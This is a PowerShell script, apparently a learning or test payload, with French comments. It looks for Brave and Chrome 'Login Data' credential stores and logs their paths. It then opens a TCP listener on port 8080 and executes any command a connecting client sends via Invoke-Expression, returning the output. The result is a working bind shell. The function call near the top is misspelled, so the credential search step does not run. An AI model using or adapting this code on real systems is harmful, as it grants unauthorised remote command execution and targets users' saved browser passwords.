
#Remove-Item -path "fichier.txt" -force


$file = "C:\Users\fengj\Desktop\Powershell\Script_Payload\fichier.txt"


Function Search-crendentials { 

			$paths = @(
				"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
				"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
				
					)
					
			foreach ($path in $paths){
				
				if(Test-Path $path){
					
					Add-Content -path $file -Value $path
					
				}
			}
}

Search-crendentialsa


#Création d'un serveur Tcp sur le port 8080
$listener= [System.Net.Sockets.TcpListener]::new(8080)

#Commencer l'écoute du serveur TCP crée sur le port choisi
$listener.Start()
Write-Host "Ecoute en cours"


#Accepter une connexion entrante : 
$client = $listener.AcceptTcpClient()
Write-Host "Client connecté"


#Ouverture d'un stream pour la communication : préparer le stream pour recevoir et envoyer des données
$stream = $client.GetStream()

#Lire les commandes envoyée par le client via la connexion reseau
$reader = New-object System.IO.StreamReader($stream)

#Permettre d'écrire au client en utilisant la connexion reseau : ecrire permettra d'envoyer la réponse des commandes émises par le client
$writer = New-Object System.IO.StreamWriter($stream)

#Permet au stream writer d'envoyer directement les données en tampon sans avoir besoin d'attendre d'autres commandes
$writer.AutoFlush = $true

#Message confirmant la connexion : 
Write-Host "Shell activé : "

#BOucle permettant d'écouter en attente de commande
while($true){

    
    
    # A l'arrivée d'une commande, on sauvegarde celle ci dans une variable $command
    $command = $reader.ReadLine()

    
    if($command){
         
         #On quitte la boucle si la commande est : exit
        if($command -eq "exit"){
            break
        }
    
         #On execute la commande avec invoke expression et on garde le resultat dans output. 2>&1 permet de rediriger le flux d'erreur (2) dans le flux principal (1)
        $output = Invoke-Expression $command 2>&1
        $formatedoutput = $output | Out-String

        
        #On utilise notre writer pour écrire le resultat au client
        $writer.WriteLine($formatedoutput)

        }

   
       

        

}





#Stopper l'écoute
$listener.Stop()
$client.Close()


#Get-Content -path $file -raw




		





		



